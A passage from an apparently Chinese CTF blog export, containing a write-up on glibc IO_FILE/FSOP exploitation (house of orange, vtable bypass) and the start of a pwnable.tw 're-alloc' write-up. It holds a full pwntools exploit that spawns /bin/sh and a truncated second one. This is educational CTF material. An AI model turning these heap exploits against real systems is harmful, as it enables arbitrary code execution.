attack</code>。之后从<code>unsortedbin</code>中切割一块large chunk泄露堆地址和libc。接着利用溢出改<code>unsortedbin</code>中剩余的地址，构造<code>unsortedbin attack</code>以及伪造的file结构体。最后malloc一个chunk，触发<code>abort</code>完成getshell。</p><p>注意<code>unsortedbin attack</code>和伪造的file结构体是写在一个堆块里面的。在malloc出错之前，已经完成了<code>unsortedbin attack</code>。这里老是忘记。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>伪造的remainder chunk大小需要满足以下几点</p><ol><li>size需要大于0x20（MINSIZE）</li><li>prev_inuse位要为1</li><li>top chunk address + top chunk size 必须是页对齐的（页大小一般为0x1000）</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./hoo&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc-2.23.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length,name,price</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Name :&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Price of Orange:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Color of Orange:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length,name,price</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Price of Orange:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Color of Orange:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;brva 0xEE6\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    see()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_file</span>(<span class="params">_flags = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_read_ptr = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_read_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_read_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_write_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_write_ptr = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_write_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_buf_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_buf_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_save_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_backup_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_save_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_marker = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_chain = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_fileno = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_lock = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_wide_data = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_mode = <span class="number">0</span></span>):</span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">    p32(<span class="number">0</span>) + \</span><br><span class="line">    p64(_IO_read_ptr) + \</span><br><span class="line">    p64(_IO_read_end) + \</span><br><span class="line">    p64(_IO_read_base) + \</span><br><span class="line">    p64(_IO_write_base) + \</span><br><span class="line">    p64(_IO_write_ptr) + \</span><br><span class="line">    p64(_IO_write_end) + \</span><br><span class="line">    p64(_IO_buf_base) + \</span><br><span class="line">    p64(_IO_buf_end) + \</span><br><span class="line">    p64(_IO_save_base) + \</span><br><span class="line">    p64(_IO_backup_base) + \</span><br><span class="line">    p64(_IO_save_end) + \</span><br><span class="line">    p64(_IO_marker) + \</span><br><span class="line">    p64(_IO_chain) + \</span><br><span class="line">    p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">build(<span class="number">0x28</span>,<span class="string">&quot;aaa&quot;</span>,<span class="number">20</span>) <span class="comment"># 1</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xF90</span>) <span class="comment"># for align</span></span><br><span class="line">upgrade(<span class="number">0x900</span>,payload1,<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">build(<span class="number">0x1000</span>,p64(<span class="number">0xdeadbeef</span>),<span class="number">20</span>) <span class="comment"># put into unsortedbin,2</span></span><br><span class="line">build(<span class="number">0x500</span>,p8(<span class="number">0x88</span>),<span class="number">20</span>) <span class="comment"># get from unsortedbin,3</span></span><br><span class="line">see()</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x3c5188</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">io_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;io_list_all: &quot;</span> + <span class="built_in">hex</span>(io_list_all))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">io_str_jmp = libc_base + <span class="number">3946400</span></span><br><span class="line">upgrade(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe</span> + <span class="string">b&#x27;bb&#x27;</span> + p8(<span class="number">0xd0</span>),<span class="number">10</span>) <span class="comment"># 2</span></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;aabb&#x27;</span>)</span><br><span class="line">heap_info = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_info: &quot;</span> + <span class="built_in">hex</span>(heap_info))</span><br><span class="line">heap_base = heap_info - <span class="number">0x0000d0</span></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base)) <span class="comment"># leak</span></span><br><span class="line"><span class="comment"># unsortedbin attack                                  # unsorted[0]    unsored[1]</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file = pack_file(_IO_read_base = io_list_all-<span class="number">0x10</span>,</span><br><span class="line">_IO_write_base = <span class="number">0</span>,</span><br><span class="line">_IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">_IO_buf_base = binsh_addr,</span><br><span class="line">_mode = <span class="number">0</span>,)</span><br><span class="line"><span class="comment"># vtable</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x6d8</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system)</span><br><span class="line"></span><br><span class="line">payload+=fake_file[<span class="number">0x10</span>:]</span><br><span class="line">upgrade(<span class="built_in">len</span>(payload),payload,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># malloc 0x10 to trigger fault</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b _IO_flush_all_lockp&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>在最后一个malloc触发<code>abort</code>之后，会依次寻找所有file结构体。调用<code>_IO_overflow</code>函数。首先完成自身的<code>_IO_overflow</code>，接着去_IO_list_all中寻找<code>_chain</code>。但是此时IO_list_all已经被我们unsortedbin attack改掉了。他的chain位置正好是之前被修改size的unsorted chunk(0x60的那个)至于为什么是0x60，可以计算一下main_arena的<code>_chain</code>位置正好就是0x60的bins的位置。</p><p><img src="/2022/02/03/IO-file-vtable/image-20220203134940087.png" alt="image-20220203134940087"></p><p>此时chain正是我们伪造的file结构体。我们看一下<code>_chain</code>中伪造的内容。</p><p><img src="/2022/02/03/IO-file-vtable/image-20220203135332227.png" alt="image-20220203135332227"></p><p>发现vtable也是可控地址，打印其中内容。</p><p><img src="/2022/02/03/IO-file-vtable/image-20220203135423678.png" alt="image-20220203135423678"></p><p>发现__overflow已经被改掉。这说明可以getshell了。由于栈结构不稳定，可能需要多尝试几次。</p><p><img src="/2022/02/03/IO-file-vtable/image-20220203135529574.png" alt="image-20220203135529574"></p><h2 id="libc-gt-2-24"><a href="#libc-gt-2-24" class="headerlink" title="libc&gt;=2.24"></a>libc&gt;=2.24</h2><p>以下为2.24之后的libc对vtable的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到主要是对vtable指针位置的检查。但是有相应的bypass方法。原理介绍可以看<a href="https://blog.csdn.net/qq_39153421/article/details/115327308">这篇</a>以及<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/exploit-in-libc2.24/#_io_str_jumps-overflow">ctf-wiki</a>。题目的例子可以看<a href="https://nicholas-wei.github.io/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">2022hws签到题</a></p><p><img src="/2022/02/03/IO-file-vtable/image-20220203141700241.png" alt="image-20220203141700241"></p><p>这里是直接伪造了vtable而不是_chain字段。此时<code>_IO_list_all</code>里面被写入的是这个chunk的地址。这是因为使用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_file = pack_file(_IO_read_base=IO_list_all-<span class="number">0x10</span>,</span><br><span class="line">_IO_write_base=<span class="number">0</span>,</span><br><span class="line">_IO_write_ptr=<span class="number">1</span>,</span><br><span class="line">_IO_buf_base=binsh_addr,</span><br><span class="line">_mode=<span class="number">0</span>,)</span><br><span class="line">fake_file += p64(IO_str_jumps-<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(system) <span class="comment"># 伪造payload，vtable为IO_str_jumps-8</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b _IO_flush_all_lockp&quot;)</span></span><br><span class="line">io.sendline(fake_file[<span class="number">0x10</span>:])</span><br></pre></td></tr></table></figure><p>注意<code>_IO_str_jumps</code>代表了一系列堆操作函数的起始位置。从中寻找相应函数是从<strong>当前IO_str_jumps位置往后找</strong>找到偏移为0x18的位置就是system。于是完成攻击。</p><p>此时rbx指向的就是我们的堆起始位置。其0xe8偏移处正好是system(“/bin/sh”)</p><p><img src="/2022/02/03/IO-file-vtable/image-20220203145615862.png" alt="image-20220203145615862"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在2.23之前，FSOP一般使用house of orange，劫持IO_list_all之后由于chain字段在0x60堆块的位置，0x60大小的small chunk正好可以被当作chain指向的内容，从而伪造了一个vtable，调用_IO_overflow完成攻击。</p><p>在libc&gt;=2.27时，可以尝试<strong>劫持vtable而不是chain</strong>来完成FSOP。具体做法只需要将fake file的vtable位置写成<code>IO_str_jumps-8</code>后续再补上system，并且IO_buf_base是”/bin/sh”的指针即可。但是需要注意的是<strong>都需要<code>unsortedbin attack</code>来完成劫持IO_list_all到自身(伪造的file结构体)对应的地址</strong>。这是成功的关键。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop">https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_check_and_bypass">https://ray-cp.github.io/archivers/IO_FILE_vtable_check_and_bypass</a></p><p><a href="https://github.com/ray-cp/pwn_category/blob/master/IO_FILE/vtable_str_jumps/hctf2017-babyprintf/exp.py">https://github.com/ray-cp/pwn_category/blob/master/IO_FILE/vtable_str_jumps/hctf2017-babyprintf/exp.py</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p><p><a href="https://blog.csdn.net/qq_39153421/article/details/115327308">https://blog.csdn.net/qq_39153421/article/details/115327308</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-realloc</title>
      <link href="/2022/02/01/pwnable-realloc/"/>
      <url>/2022/02/01/pwnable-realloc/</url>
      
        <content type="html"><![CDATA[<p>新年快乐！祝大家和小然虎虎生威，虎年大吉<br>也不知道能记录多少pwnable.tw的做题记录，这是本博客的第一篇，那就新的一年希望自己坚持下去！</p><span id="more"></span><h1 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  pwnable checksec ./re-alloc</span><br><span class="line">[*] </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span><br><span class="line">    RUNPATH:  b&#x27;..&#x27;</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>可以看到对got表没有保护，也没有PIE。</p><h2 id="分析程序执行流"><a href="#分析程序执行流" class="headerlink" title="分析程序执行流"></a>分析程序执行流</h2><p>菜单题，增，删和<code>realloc</code>三种功能。其中漏洞比较明显的是在<code>realloc</code>中。以下记录一下<a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/">这位师傅wp</a>中总结的关于<code>realloc</code>的内容。（我在一个地方卡住了，看的这位师傅的博客）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">realloc</span>(ptr,size)</span><br><span class="line"><span class="number">1.</span>ptr == <span class="number">0</span> : <span class="built_in">malloc</span>(size)</span><br><span class="line"><span class="number">2.</span>ptr != <span class="number">0</span> &amp;&amp; size == <span class="number">0</span> : <span class="built_in">free</span>(ptr)</span><br><span class="line"><span class="number">3.</span>ptr != <span class="number">0</span> &amp;&amp; size == old_size : edit(ptr)</span><br><span class="line"><span class="number">3.</span>ptr != <span class="number">0</span> &amp;&amp; size &lt; old_size : edit(ptr) and <span class="built_in">free</span>(remainder)</span><br><span class="line"><span class="number">4.</span>ptr != <span class="number">0</span> &amp;&amp; size &gt; old_size : <span class="built_in">malloc</span>(size);<span class="built_in">strcpy</span>(new_ptr,ptr);<span class="built_in">free</span>(ptr);<span class="keyword">return</span> new_ptr</span><br></pre></td></tr></table></figure><p>以下是漏洞点。其实realloc还给了我们edit功能。</p><p><img src="/2022/02/01/pwnable-realloc/image-20220201195831772.png" alt="image-20220201195831772"></p><p>就是简单的UAF?我一开始也这么觉得，然后开始做了，发现实际上<strong>有大坑</strong>。这道题让管理的总堆块数目只有两个，而且限制堆块大小小于unsortedbin，避免了直接泄露libc。因此tcache攻击之类的很难用。然后我就卡在这里了，因为没法泄露地址。</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>这题用到一个很巧妙的方法。注意<code>read_long</code>中的<code>atoll</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">read_long</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __read_chk(<span class="number">0LL</span>, nptr, <span class="number">16LL</span>, <span class="number">17LL</span>);</span><br><span class="line">  <span class="keyword">return</span> atoll(nptr); <span class="comment">// &lt;====注意这里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>atoll</code>是一个库函数，其got表可以被劫持。这里巧妙的思路就是<strong>把<code>atoll</code>劫持为<code>printf</code>，利用<code>printf</code>的格式化输出功能打印栈上数据泄露libc</strong>。实在是没想到过这样利用。</p><p>需要注意的是，劫持之后一般的功能也不能直接用了，因为atoll被改掉了，但是可以利用<code>printf</code>返回值（可以用格式化输出%nc来控制返回值）继续执行程序。</p><p>此外最困难的就是堆风水了。只有两个指针，真的很难堆:(  <strong>最终再把atoll改成system，发一个/bin/sh就行了</strong>。因此最难的部分其实是想到如何泄露libc，以及泄露之前的堆风水，控got表的过程。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>不得不说，pwnable的服务器是真的慢，到现在也没发完payload。不发了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./re-alloc&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;libc.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># io = remote(&#x27;chall.pwnable.tw&#x27;, 10106)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    io.recvuntil(<span 